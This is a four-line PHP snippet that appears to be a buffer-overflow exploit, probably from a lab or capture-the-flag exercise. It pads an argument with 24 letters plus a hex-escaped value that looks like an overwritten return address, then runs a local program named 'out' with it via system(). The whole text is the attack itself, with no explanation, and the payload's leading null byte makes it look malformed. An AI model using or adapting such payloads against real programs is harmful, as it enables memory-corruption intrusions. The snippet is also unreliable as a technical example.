$arg = "ABCDEFGHIJKLMNOPQRSTUVWX"."\x0000000000B01370";
$cmd = "out ".$arg;

system($cmd);

